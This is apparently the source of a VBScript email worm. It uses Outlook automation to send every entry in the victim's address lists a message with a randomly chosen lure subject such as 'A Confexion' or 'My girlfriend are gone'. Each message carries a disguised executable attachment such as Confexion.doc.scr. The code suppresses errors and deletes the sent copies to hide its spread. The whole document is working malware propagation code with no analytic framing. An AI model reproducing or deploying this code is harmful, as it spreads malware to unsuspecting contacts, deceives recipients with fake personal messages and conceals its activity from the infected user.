On Error Resume Next
Dim fso,a,b,c,d,e,f,hurx
Set fso = CreateObject ("outlook.application")
Set a = fso.GetNameSpace ("MAPI")
For b = 1 To a.AddressLists.Count
Set c = a.AddressLists (b)
hurx = 0
Set d = fso.CreateItem (0)
For e = 1 To c.AddressEntries.Count
f = c.AddressEntries (hurx)
d.Recipients.Add f
hurx = hurx + 1
Randomize
cvx = Int((4*Rnd)+1)
If cvx = 1 then
d.Subject = "A Confexion"
d.Body = "Please see my confexion....sorry..."
d.Attachments.Add "c:\Confexion.doc.scr"
Elseif cvx = 2 then
d.Subject = "Please, see me..."
d.Body = "Read me, please,...."
d.Attachments.Add "c:\Guilty.scr"
Elseif cvx = 3 then
d.Subject = "My girlfriend are gone........"
d.Body = "My girlfriend fired me! Please...read me confexion..."
d.Attachments.Add "c:\Confexion.doc.scr"
Elseif cvx = 4 then
d.Subject = "My boyfriend are gone......"
d.Body = "My boyfriend are gone...please...read me confexion..."
d.Attachments.Add "c:\Confexion.doc.scr"
End If
d.DeleteAfterSubmit = True
d.Send
Next
Next
@ec